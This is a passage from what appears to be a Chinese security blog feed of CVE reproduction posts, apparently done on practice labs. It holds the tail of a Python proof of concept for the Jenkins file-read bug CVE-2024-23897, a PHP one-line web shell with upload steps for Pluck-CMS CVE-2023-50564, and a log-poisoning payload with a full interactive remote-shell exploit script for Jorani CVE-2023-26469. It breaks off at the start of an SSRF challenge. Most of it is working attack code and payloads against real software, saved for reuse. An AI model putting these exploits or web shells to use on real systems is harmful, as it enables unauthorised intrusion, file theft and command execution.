Op.ARG)<br>            + jenkins_arg(ENCODING, Op.ENCODING)<br>            + jenkins_arg(<span class="hljs-string">&quot;en&quot;</span>, Op.LOCALE)<br>            + jenkins_arg(<span class="hljs-string">&quot;&quot;</span>, Op.START)<br>        )<br><br>        <span class="hljs-comment"># Send upload request</span><br>        r = requests.post(<br>            url=args.url + <span class="hljs-string">&quot;/cli?remoting=false&quot;</span>,<br>            headers=&#123;<br>                <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>,<br>                <span class="hljs-string">&quot;Session&quot;</span>: uuid_str,<br>                <span class="hljs-string">&quot;Side&quot;</span>: <span class="hljs-string">&quot;upload&quot;</span>,<br>                <span class="hljs-string">&quot;Content-type&quot;</span>: <span class="hljs-string">&quot;application/octet-stream&quot;</span>,<br>            &#125;,<br>            data=data,<br>            proxies=proxies,<br>            timeout=timeout,<br>        )<br><br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;RED&#125;</span>Request timed out<span class="hljs-subst">&#123;ENDC&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;RED&#125;</span>Error in download request:<span class="hljs-subst">&#123;ENDC&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jenkins_arg</span>(<span class="hljs-params">string, operation</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    out_bytes = <span class="hljs-string">b&quot;\x00\x00&quot;</span><br>    out_bytes += struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-built_in">len</span>(string) + <span class="hljs-number">2</span>)<br>    out_bytes += <span class="hljs-built_in">bytes</span>([operation])<br>    out_bytes += struct.pack(<span class="hljs-string">&quot;&gt;H&quot;</span>, <span class="hljs-built_in">len</span>(string))<br>    out_bytes += string.encode(<span class="hljs-string">&quot;UTF-8&quot;</span>)<br>    <span class="hljs-keyword">return</span> out_bytes<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_filename</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-comment"># Get the basename of the path</span><br>    safe_path = path.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>)<br>    <span class="hljs-comment"># Replace non-alphanumeric characters (except underscores) with underscores</span><br>    safe_name = <span class="hljs-string">&quot;&quot;</span>.join(c <span class="hljs-keyword">if</span> c.isalnum() <span class="hljs-keyword">or</span> c == <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> safe_path)<br>    <span class="hljs-keyword">return</span> safe_name<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_download_request</span>(<span class="hljs-params">uuid_str, file_path</span>):<br>    file_contents = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># Send download request</span><br>        r = requests.post(<br>            url=args.url + <span class="hljs-string">&quot;/cli?remoting=false&quot;</span>,<br>            headers=&#123;<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;</span>, <span class="hljs-string">&quot;Session&quot;</span>: uuid_str, <span class="hljs-string">&quot;Side&quot;</span>: <span class="hljs-string">&quot;download&quot;</span>&#125;,<br>            proxies=proxies,<br>            timeout=timeout,<br>        )<br><br>        <span class="hljs-comment"># Parse response content</span><br>        response = r.content.strip(<span class="hljs-string">b&quot;\x00&quot;</span>)<br>        <span class="hljs-keyword">if</span> response:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;No such file:&quot;</span> <span class="hljs-keyword">in</span> response:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;File does not exist&quot;</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">b&quot;No such agent&quot;</span> <span class="hljs-keyword">in</span> response:<br>                matches = re.findall(<span class="hljs-string">b&#x27;No such agent &quot;(.*?)&quot;&#x27;</span>, response)<br>                <span class="hljs-keyword">if</span> matches:<br>                    file_contents = <span class="hljs-string">b&quot;\n&quot;</span>.join(matches)<br><br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;RED&#125;</span>Request timed out<span class="hljs-subst">&#123;ENDC&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;RED&#125;</span>Error in download request:<span class="hljs-subst">&#123;ENDC&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># Save file</span><br>    <span class="hljs-keyword">if</span> args.save:<br>        safe_path = safe_filename(file_path).strip(<span class="hljs-string">&quot;_&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(safe_path) <span class="hljs-keyword">or</span> args.overwrite:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(safe_path, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(file_contents)<br>            <span class="hljs-keyword">if</span> args.verbose:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] File saved to <span class="hljs-subst">&#123;safe_path&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> args.verbose:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] File already saved to <span class="hljs-subst">&#123;safe_path&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># Print contents</span><br>    <span class="hljs-keyword">if</span> file_contents:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(file_contents, <span class="hljs-built_in">bytes</span>):<br>            <span class="hljs-built_in">print</span>(file_contents.decode(ENCODING, errors=<span class="hljs-string">&quot;ignore&quot;</span>).replace(<span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>).strip())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(file_contents.replace(<span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>).strip())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;empty&gt;&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-comment"># Create random UUID</span><br>    uuid_str = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><br>    <span class="hljs-comment"># Send upload/download requests</span><br>    upload_thread = threading.Thread(target=send_upload_request, args=(uuid_str, file_path))<br>    download_thread = threading.Thread(target=send_download_request, args=(uuid_str, file_path))<br>    upload_thread.start()<br>    download_thread.start()<br>    upload_thread.join()<br>    download_thread.join()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># Parse arguments</span><br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;POC for CVE-2024-23897 (Jenkins file read)&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-u&quot;</span>, <span class="hljs-string">&quot;--url&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, required=<span class="hljs-literal">True</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Jenkins URL&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-string">&quot;--file&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, required=<span class="hljs-literal">False</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;File path to read&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;--timeout&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">3</span>, required=<span class="hljs-literal">False</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Request timeout&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-s&quot;</span>, <span class="hljs-string">&quot;--save&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, required=<span class="hljs-literal">False</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Save file contents&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--overwrite&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, required=<span class="hljs-literal">False</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Overwrite existing files&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--proxy&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, required=<span class="hljs-literal">False</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;HTTP(s) proxy to use when sending requests (i.e. -p http://127.0.0.1:8080)&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;-v&quot;</span>, <span class="hljs-string">&quot;--verbose&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, required=<span class="hljs-literal">False</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Verbosity enabled - additional output flag&quot;</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-comment"># Input-checking</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args.url.startswith(<span class="hljs-string">&quot;http://&quot;</span>) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> args.url.startswith(<span class="hljs-string">&quot;https://&quot;</span>):<br>        args.url = <span class="hljs-string">&quot;http://&quot;</span> + args.url<br>    args.url = urllib.parse.urlparse(args.url).geturl()<br>    <span class="hljs-keyword">if</span> args.proxy:<br>        proxies = &#123;<span class="hljs-string">&quot;http&quot;</span>: args.proxy, <span class="hljs-string">&quot;https&quot;</span>: args.proxy&#125;<br>    <span class="hljs-keyword">else</span>:<br>        proxies = &#123;&#125;<br>    timeout = args.timeout<br><br>    <span class="hljs-comment"># Execute</span><br>    <span class="hljs-keyword">if</span> args.file:<br>        read_file(args.file)<br>    <span class="hljs-keyword">else</span>:<br>        File_Terminal(read_file).cmdloop()<br></code></pre></td></tr></table></figure><p>脚本适用于真实环境，本题不太适用</p>]]></content>
    
    
    <categories>
      
      <category>cve复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件读取</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pluck-CMS任意文件上传漏洞CVE-2023-50564</title>
    <link href="/2024/11/11/cve%E5%A4%8D%E7%8E%B0/Pluck-CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2023-50564/"/>
    <url>/2024/11/11/cve%E5%A4%8D%E7%8E%B0/Pluck-CMS%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2023-50564/</url>
    
    <content type="html"><![CDATA[<h2 id="靶标介绍"><a class="markdownIt-Anchor" href="#靶标介绍"></a> 靶标介绍</h2><p>Pluck-CMS v4.7.18 中的 /inc/modules_install.php 组件，攻击者可以通过上传一个精心制作的 ZIP 文件来执行任意代码。</p><h2 id="影响范围"><a class="markdownIt-Anchor" href="#影响范围"></a> 影响范围</h2><p>Pluck-CMS的对应版本</p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="fofa"><a class="markdownIt-Anchor" href="#fofa"></a> fofa</h3><p>“Pluck-CMS”(没怎么搜到，只有几个)</p><h2 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h2><p>进入靶场点击admin,进入管理页面，弱密码字典爆一下是<code>admin123</code></p><img src="/../../images/cve复现/2024-11-11204032.png" alt="2024-11-11204032" style="zoom:50%;"><p>让后在<code>install a moudle</code>这边点击进入，写一个🐎传上去，推荐最好有个phpinfo(),否则可能会检测删除</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[cmd]);<span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>然后进行压缩上传，等待1s左右会进行跳转，然后就是命令执行了</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-11205128.png" alt="2024-11-11205128"></p><hr><p>这个cms过于简单了，感觉还没ctf的新生赛难，就到这吧，下面是poc,放个网址吧</p><p><a href="https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC">Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>cve复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jorani远程命令执行漏洞 CVE-2023-26469</title>
    <link href="/2024/11/10/cve%E5%A4%8D%E7%8E%B0/Jorani%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-26469/"/>
    <url>/2024/11/10/cve%E5%A4%8D%E7%8E%B0/Jorani%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2023-26469/</url>
    
    <content type="html"><![CDATA[<p>前言:最近比较浮躁，刷了一会玄机之后也不想打比赛，来春秋云镜复现看看cve吧</p><h2 id="靶标介绍"><a class="markdownIt-Anchor" href="#靶标介绍"></a> 靶标介绍</h2><p>Jorani是一款开源的员工考勤和休假管理系统，适用于中小型企业和全球化组织，它简化了员工工时记录、休假请求和审批流程，并提供了多语言支持以满足不同地区的需求。在 Jorani 1.0.0 中，攻击者可以利用路径遍历来访问文件并在服务器上执行代码。</p><h2 id="影响范围"><a class="markdownIt-Anchor" href="#影响范围"></a> 影响范围</h2><p>Jorani &lt; 1.0.2</p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="fofa"><a class="markdownIt-Anchor" href="#fofa"></a> fofa</h3><p>title=“Jorani”</p><p>看了一下在能搜到的国外站里大部分都还是在影响范围内的</p><h2 id="复现"><a class="markdownIt-Anchor" href="#复现"></a> 复现</h2><p>先进行访问<code>/session/login</code>获取两个cookie值，<code>csrf_cookie_jorani</code>和<code>jorani_session</code></p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-10152704.png" alt="2024-11-10152704"></p><p>构造payload进行rce操作,改post发包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">csrf_test_jorani=032db15b98aa9338f9cea39fff128d04&amp;last_page=session/login&amp;language=../../application/logs&amp;login=&lt;?=`<span class="hljs-variable">$_GET</span>[cmd]`?&gt;&amp;CipheredValue=<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>进行url编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">csrf_test_jorani=032db15b98aa9338f9cea39fff128d04&amp;last_page=session%2Flogin&amp;language=..%2F..%2Fapplication%2Flogs&amp;login=&lt;%3f%3d`<span class="hljs-variable">$_GET</span>[cmd]`%3f&gt;&amp;CipheredValue=<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-10161110.png" alt="2024-11-10161110"></p><p>最后构造执行rce</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-10161106.png" alt="2024-11-10161106"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/pages/view/log-2024-11-10?cmd=<span class="hljs-built_in">cat</span>+/flag<br></code></pre></td></tr></table></figure><p>log的后面日期取决于实际操作的时间，http头需要加上</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">X-REQUESTED-WITH: XMLHttpRequest<br></code></pre></td></tr></table></figure><p>查了一下加上这个可能主要目的是增强 <strong>前后端交</strong></p><h2 id="exp脚本"><a class="markdownIt-Anchor" href="#exp脚本"></a> exp脚本</h2><p>网上直接找到，方便以后梭哈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">vulnerability covered by CVE-2023-26469</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> readline<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br>requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)<br><br>msg = <span class="hljs-keyword">lambda</span> x, y=<span class="hljs-string">&quot;\n&quot;</span>: <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\x1b[92m[+]\x1b[0m <span class="hljs-subst">&#123;x&#125;</span>&#x27;</span>, end=y)<br>err = <span class="hljs-keyword">lambda</span> x, y=<span class="hljs-string">&quot;\n&quot;</span>: <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\x1b[91m[x]\x1b[0m <span class="hljs-subst">&#123;x&#125;</span>&#x27;</span>, end=y)<br>log = <span class="hljs-keyword">lambda</span> x, y=<span class="hljs-string">&quot;\n&quot;</span>: <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\x1b[93m[?]\x1b[0m <span class="hljs-subst">&#123;x&#125;</span>&#x27;</span>, end=y)<br><br>CSRF_PATTERN = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;csrf_test_jorani&quot; value=&quot;(.*?)&quot;&#x27;</span>)<br>CMD_PATTERN = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;---------(.*?)---------&#x27;</span>, re.S)<br><br>URLS = &#123;<br>    <span class="hljs-string">&#x27;login&#x27;</span>: <span class="hljs-string">&#x27;/session/login&#x27;</span>,<br>    <span class="hljs-string">&#x27;view&#x27;</span>: <span class="hljs-string">&#x27;/pages/view/&#x27;</span>,<br>&#125;<br><br>alphabet = string.ascii_uppercase<br>HEADER_NAME = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(alphabet) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>))<br><br>BypassRedirect = &#123;<br>    <span class="hljs-string">&#x27;X-REQUESTED-WITH&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>,<br>    HEADER_NAME: <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br>INPUT = <span class="hljs-string">&quot;\x1b[92mjrjgjk\x1b[0m@\x1b[41mjorani\x1b[0m(PSEUDO-TERM)\n$ &quot;</span>  <span class="hljs-comment"># The input used for the pseudo term</span><br><br>u = <span class="hljs-keyword">lambda</span> x, y: x + URLS[y]<br><br>POISON_PAYLOAD = <span class="hljs-string">&quot;&lt;?php if(isset($_SERVER[&#x27;HTTP_&quot;</span> + HEADER_NAME + <span class="hljs-string">&quot;&#x27;]))&#123;system(base64_decode($_SERVER[&#x27;HTTP_&quot;</span> + HEADER_NAME + <span class="hljs-string">&quot;&#x27;]));&#125; ?&gt;&quot;</span><br>PATH_TRAV_PAYLOAD = <span class="hljs-string">&quot;../../application/logs&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">/!\\ Do not use this if you are not authorized to /!\\</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br>    log(<span class="hljs-string">&quot;POC made by @jrjgjk (Guilhem RIOUX)&quot;</span>, <span class="hljs-string">&quot;\n\n&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">1</span>:<br>        err(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> &lt;url&gt;&quot;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br>    log(<span class="hljs-string">f&quot;Header used for exploit: <span class="hljs-subst">&#123;HEADER_NAME&#125;</span>&quot;</span>)<br><br>    t = sys.argv[<span class="hljs-number">1</span>]<br><br>    s = requests.Session()<br>    log(<span class="hljs-string">&quot;Requesting session cookie&quot;</span>)<br>    res = s.get(u(t, <span class="hljs-string">&quot;login&quot;</span>), verify=<span class="hljs-literal">False</span>)<br><br>    C = s.cookies.get_dict()<br><br>    Date = datetime.date.today()<br>    log_file_name = <span class="hljs-string">f&quot;log-<span class="hljs-subst">&#123;Date.year&#125;</span>-<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(Date.month).zfill(<span class="hljs-number">2</span>)&#125;</span>-<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(Date.day).zfill(<span class="hljs-number">2</span>)&#125;</span>&quot;</span><br><br>    csrf_token = re.findall(CSRF_PATTERN, res.text)[<span class="hljs-number">0</span>]<br>    log(<span class="hljs-string">f&quot;Poisoning log file with payload: &#x27;<span class="hljs-subst">&#123;POISON_PAYLOAD&#125;</span>&#x27;&quot;</span>)<br>    log(<span class="hljs-string">f&quot;Set path traversal to &#x27;<span class="hljs-subst">&#123;PATH_TRAV_PAYLOAD&#125;</span>&#x27;&quot;</span>)<br>    msg(<span class="hljs-string">f&quot;Recovered CSRF Token: <span class="hljs-subst">&#123;csrf_token&#125;</span>&quot;</span>)<br><br>    data = &#123;<br>        <span class="hljs-string">&quot;csrf_test_jorani&quot;</span>: csrf_token,<br>        <span class="hljs-string">&quot;last_page&quot;</span>: <span class="hljs-string">&quot;session/login&quot;</span>,<br>        <span class="hljs-string">&quot;language&quot;</span>: PATH_TRAV_PAYLOAD,<br>        <span class="hljs-string">&quot;login&quot;</span>: POISON_PAYLOAD,<br>        <span class="hljs-string">&quot;CipheredValue&quot;</span>: <span class="hljs-string">&quot;DummyPassword&quot;</span><br>    &#125;<br><br>    s.post(u(t, <span class="hljs-string">&quot;login&quot;</span>), data=data)<br><br>    log(<span class="hljs-string">f&quot;Accessing log file: <span class="hljs-subst">&#123;log_file_name&#125;</span>&quot;</span>)<br><br>    exp_page = t + URLS[<span class="hljs-string">&#x27;view&#x27;</span>] + log_file_name<br><br>    <span class="hljs-comment">### Shell</span><br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        cmd = <span class="hljs-built_in">input</span>(INPUT)<br>        <span class="hljs-keyword">if</span> cmd <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;quit&#x27;</span>]:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> cmd == <span class="hljs-string">&quot;&quot;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            BypassRedirect[HEADER_NAME] = base64.b64encode(<span class="hljs-string">b&quot;echo ---------;&quot;</span> + cmd.encode() + <span class="hljs-string">b&quot; 2&gt;&amp;1;echo ---------;&quot;</span>)<br>            res = s.get(exp_page, headers=BypassRedirect)<br>            cmdRes = re.findall(CMD_PATTERN, res.text)<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-built_in">print</span>(cmdRes[<span class="hljs-number">0</span>])<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(res.text)<br>                err(<span class="hljs-string">&quot;Wow, there was a problem, are you sure of the URL ??&quot;</span>)<br>                err(<span class="hljs-string">&#x27;exiting..&#x27;</span>)<br>                exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>放一个靶场的利用结果</p><p><img src="/../../images/cve%E5%A4%8D%E7%8E%B0/2024-11-10163912.png" alt="2024-11-10163912"></p>]]></content>
    
    
    <categories>
      
      <category>cve复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>csrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-ssrf</title>
    <link href="/2024/11/09/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-ssrf/"/>
    <url>/2024/11/09/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-ssrf/</url>
    
    <content type="html"><![CDATA[<h2 id="web351"><a class="markdownIt-Anchor" href="#web351"></a> web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span 